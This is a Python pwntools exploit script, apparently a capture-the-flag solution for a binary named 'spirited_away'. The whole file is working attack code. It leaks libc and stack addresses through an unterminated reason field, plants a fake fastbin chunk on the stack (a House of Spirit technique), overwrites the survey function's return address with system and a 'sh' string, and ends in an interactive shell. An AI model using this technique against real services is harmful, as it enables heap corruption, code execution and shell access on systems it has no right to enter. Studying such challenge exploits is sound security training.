# -*-coding:utf-8-*-
# author: 0x4C43

from pwn import *

context.log_level = 'debug'

elf = ELF('./spirited_away')
libc = ELF('./libc-2.23.so')

p = process('./spirited_away')

def comment1(name,age,reason,comment):
    p.recvuntil('name: ')
    p.send(name)
    p.recvuntil('age: ')
    p.sendline(age)
    p.recvuntil('movie? ')
    p.send(reason)
    p.recvuntil('comment: ')
    p.send(comment)

def comment2(age,reason):
    p.recvuntil('age: ')
    p.sendline(age)
    p.recvuntil('movie? ')
    p.sendline(reason)
  
def leaklibc():
    comment1("BBBB","20",24*"B","BBBB")
    p.recvuntil('Reason: ')
    p.recv(24)
    addr = u32(p.recv(4))
    print hex(addr)
    libc_base = addr -libc.symbols['_IO_file_sync']-7
    p.recvuntil('<y/n>: ')
    p.send('y')
    return libc_base

def leakstack():	
    comment1("BBBB","20",80*"B","BBBB")
    p.recvuntil('Reason: ')
    p.recv(80)
    addr = u32(p.recv(4))
    p.recvuntil('<y/n>: ')
    p.send('y')
    return addr

def fakechunk(stack):
    fake_chunk = "DDDD"        # prev_size
    fake_chunk += p32(0x41)    # size
    fake_chunk += (0x40-8)*"D"
    fake_chunk += p32(0)  
    fake_chunk += p32(0x41)    # next chunk size
    
    fake_chunk_ptr = stack - 0x70 + 8
    comment  = "D" * 0x50
    comment += p32(0x00)       # fake age
    comment += p32(fake_chunk_ptr) # overwrite name ptr
    
    comment1("DDDD","40",fake_chunk, comment)
    p.recvuntil('<y/n>: ')
    p.send('y')

def main():
    raw_input('add 100 comment to overwrite nbytes')
    for i in range(10):
        comment1("AAAA","10","AAAA","AAAA")
        p.recvuntil('<y/n>: ')
        p.sendline('y')
    for i in range(90):
        comment2("10","AAAA")
        p.recvuntil('<y/n>: ')
        p.send('y')   

    raw_input('leak system_addr')
    libc_base = leaklibc()
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('sh\0'))
    log.success("system_addr: {}".format(hex(system_addr)))
    log.success("binsh_addr: {}".format(hex(binsh_addr)))

    raw_input('leak stack address')
    stack_addr = leakstack()
    log.success("stack_addr: {}".format(hex(stack_addr)))

    raw_input('overflow return addr to exec system("/bin/sh")')   
    # add fake chunk to fastbin
    fakechunk(stack_addr)
    # alloc fake chunk to name, and overwrite return addr of survey
    name = 76*"E" + p32(system_addr) + "EEEE" + p32(binsh_addr)
    comment1(name,"50","EEEE","EEEE")
    p.recvuntil('<y/n>: ')
    p.send('n')
    p.interactive()

if __name__ == "__main__":
    main()

